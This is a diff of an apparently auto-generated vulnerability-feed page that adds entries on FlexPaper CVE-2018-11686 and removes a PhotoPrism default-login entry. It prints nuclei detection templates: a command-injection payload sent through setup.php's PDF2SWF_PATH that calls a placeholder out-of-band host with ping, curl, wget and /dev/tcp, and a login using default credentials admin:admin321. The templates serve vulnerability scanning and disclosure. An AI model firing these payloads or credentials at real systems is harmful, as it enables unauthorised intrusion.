@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T03:38:41.960Z</updated>
+  <updated>2025-06-17T05:15:21.216Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,59 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FlexPaper Remote Code Execution Vulnerability</title>
+    <link href="http://example.com/2025/06/17/github_3559610032/"/>
+    <id>http://example.com/2025/06/17/github_3559610032/</id>
+    <published>2025-06-17T05:15:21.222Z</published>
+    <updated>2025-06-17T05:15:21.216Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FlexPaper Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11686</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlexPaper (FlowPaper) 2.3.6版本中的setup.php和change_config.php文件存在不安全处理，导致远程攻击者可以执行任意代码。利用此漏洞需要能够访问这些脚本。</p><p><strong>产品厂商：</strong> FlexPaper</p><p><strong>产品名称：</strong> FlexPaper (FlowPaper)</p><p><strong>影响版本：</strong> 2.3.6</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12369">https://github.com/projectdiscovery/nuclei-templates/issues/12369</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>FlexPaper (FlowPaper) 2.3.6 contains a remote code execution caused by insecure handling in setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution">https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution</a></li><li><a href="https://vulncheck.com/xdb/b67f601a7711">https://vulncheck.com/xdb/b67f601a7711</a></li><li><a href="https://github.com/mpgn/CVE-2018-11686">https://github.com/mpgn/CVE-2018-11686</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:mpgn&#x2F;CVE-2018-11686.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FlexPaper Remote Code Execution Vulnera</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>FlexPaper 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/17/github_2602911422/"/>
+    <id>http://example.com/2025/06/17/github_2602911422/</id>
+    <published>2025-06-17T05:15:13.666Z</published>
+    <updated>2025-06-17T05:15:13.667Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FlexPaper 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11686</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlexPaper (FlowPaper) 2.3.6版本中的setup.php和change_config.php存在不安全处理，允许远程攻击者执行任意代码，利用此漏洞需要访问这些脚本。成功利用此漏洞可能导致未经授权的访问、数据泄露以及目标系统的潜在危害。</p><p><strong>产品厂商：</strong> flowpaper</p><p><strong>产品名称：</strong> flexpaper</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2.3.6</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/7337041215e8668334094052d42fd5c634d2067f/http%2Fcves%2F2018%2FCVE-2018-11686.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/7337041215e8668334094052d42fd5c634d2067f/http%2Fcves%2F2018%2FCVE-2018-11686.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11686</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FlexPaper <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> mpgn, pszyszkowski<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    FlexPaper (FlowPaper) <span class="hljs-number">2.3</span>.<span class="hljs-number">6</span> contains a remote code execution caused by insecure handling <span class="hljs-keyword">in</span> setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the target system.<br>  <span class="hljs-params">remediation:</span> |<br>    Update to version <span class="hljs-operator">&gt;</span> <span class="hljs-number">2.3</span>.<span class="hljs-number">6</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/b67f601a7711</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/mpgn/CVE-2018-11686</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11686</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:flowpaper:flexpaper:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> flowpaper<br>    <span class="hljs-params">product:</span> flexpaper<br>  <span class="hljs-params">tags:</span> cve2018,cve,flexpaper,shell,rce,auth-bypass,instrusive<br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">callback:</span> <span class="hljs-string">&quot;ping%20-c1%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20nslookup%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20echo%201%20%3e%2fdev%2ftcp%2f%7b%7binteractsh-url%7d%7d%2f80%20%7c%7c%20curl%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-o%20%2fdev%2fnull%20%7c%7c%20wget%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-O%20%2fdev%2fnull%3b&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/php/setup.php?step=4&amp;PDF2SWF_PATH=&#123;&#123;callback&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;dns&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;http&quot;</span><br><br><span class="hljs-comment"># digest: 4b0a00483046022100f924254dee70f4c9507b01ac1ef4e94911b8a694b6fb7daa07a3f1dcb0bbbb060221009132d652a5f53242d9864478eaa301c02195fd754fe067c7527fedf7c6101f3d:922c64590222798bb761d5b6d8e72950</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FlexPaper 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>巴拉圭正成为网络犯罪分子的目标--740 万份公民记录待售</title>
@@ -173,32 +226,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>FlexPaper Remote Code Execution Vulnerability</title>
-    <link href="http://example.com/2025/06/17/github_3559610032/"/>
-    <id>http://example.com/2025/06/17/github_3559610032/</id>
-    <published>2025-06-17T02:15:15.516Z</published>
-    <updated>2025-06-17T02:15:15.512Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FlexPaper Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11686</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlexPaper (FlowPaper) 2.3.6版本中的setup.php和change_config.php文件存在不安全处理，导致远程攻击者可以执行任意代码。利用此漏洞需要能够访问这些脚本。</p><p><strong>产品厂商：</strong> FlexPaper</p><p><strong>产品名称：</strong> FlexPaper</p><p><strong>影响版本：</strong> 2.3.6</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12369">https://github.com/projectdiscovery/nuclei-templates/issues/12369</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>FlexPaper (FlowPaper) 2.3.6 contains a remote code execution caused by insecure handling in setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution">https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution</a></li><li><a href="https://vulncheck.com/xdb/b67f601a7711">https://vulncheck.com/xdb/b67f601a7711</a></li><li><a href="https://github.com/mpgn/CVE-2018-11686">https://github.com/mpgn/CVE-2018-11686</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:mpgn&#x2F;CVE-2018-11686.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FlexPaper Remote Code Execution Vulnera</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -520,33 +547,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PhotoPrism 默认登录漏洞</title>
-    <link href="http://example.com/2025/06/16/github_319756754/"/>
-    <id>http://example.com/2025/06/16/github_319756754/</id>
-    <published>2025-06-16T17:18:55.536Z</published>
-    <updated>2025-06-16T17:18:55.534Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PhotoPrism 默认登录漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PhotoPrism是一个AI驱动的去中心化网络照片应用。此模板检测使用默认凭证（admin:admin321）的实例。</p><p><strong>产品厂商：</strong> PhotoPrism</p><p><strong>产品名称：</strong> PhotoPrism</p><p><strong>搜索语法：</strong> title:”PhotoPrism”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/6b3de02a87f72994ccf6fb02049d6b099576bfa1/http%2Fdefault-logins%2Fphotoprism-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6b3de02a87f72994ccf6fb02049d6b099576bfa1/http%2Fdefault-logins%2Fphotoprism-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> photoprism-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PhotoPrism <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    PhotoPrism is an AI-powered photos app for the decentralized web. This template detects instances using default credentials (admin:admin321).<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>docs.photoprism.app<span class="hljs-operator">/</span>getting-started<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;PhotoPrism&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;PhotoPrism&quot;</span><br>  <span class="hljs-params">tags:</span> photoprism,default-login,misconfig<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> admin<br>  <span class="hljs-params">password:</span> admin321<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/api/v1/session</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;password&#125;&#125;&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains_all(body, <span class="hljs-string">&quot;access_token<span class="hljs-char escape_">\&quot;</span>:&quot;</span>, <span class="hljs-string">&quot;config<span class="hljs-char escape_">\&quot;</span>:&#123;&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;application/json&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PhotoPrism 默认登录漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
     
   </entry>
   
